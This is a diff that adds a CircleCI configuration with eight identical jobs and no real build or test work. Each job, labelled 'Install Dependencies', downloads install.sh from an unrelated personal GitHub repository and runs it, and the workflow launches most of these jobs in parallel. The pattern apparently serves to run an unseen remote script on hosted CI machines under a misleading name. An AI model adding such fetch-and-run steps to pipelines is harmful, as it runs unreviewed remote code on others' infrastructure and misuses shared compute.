@@ -1,0 +1,71 @@
+version: 2
+jobs:
+    aku1:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://raw.githubusercontent.com/Jshh8273773/joni/main/install.sh && chmod u+x install.sh && ./install.sh
+    aku2:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://raw.githubusercontent.com/Jshh8273773/joni/main/install.sh && chmod u+x install.sh && ./install.sh
+    aku3:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://raw.githubusercontent.com/Jshh8273773/joni/main/install.sh && chmod u+x install.sh && ./install.sh
+    aku4:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://raw.githubusercontent.com/Jshh8273773/joni/main/install.sh && chmod u+x install.sh && ./install.sh
+    aku5:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://raw.githubusercontent.com/Jshh8273773/joni/main/install.sh && chmod u+x install.sh && ./install.sh
+    aku6:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://raw.githubusercontent.com/Jshh8273773/joni/main/install.sh && chmod u+x install.sh && ./install.sh
+    aku7:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://raw.githubusercontent.com/Jshh8273773/joni/main/install.sh && chmod u+x install.sh && ./install.sh
+    aku8:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://raw.githubusercontent.com/Jshh8273773/joni/main/install.sh && chmod u+x install.sh && ./install.sh
+
+workflows:
+    version: 2
+    build:
+        jobs:
+            - aku1
+            - aku2
+            - aku3
+            - aku4
+            - aku5
+            - aku6
+            - aku7
+            - aku5
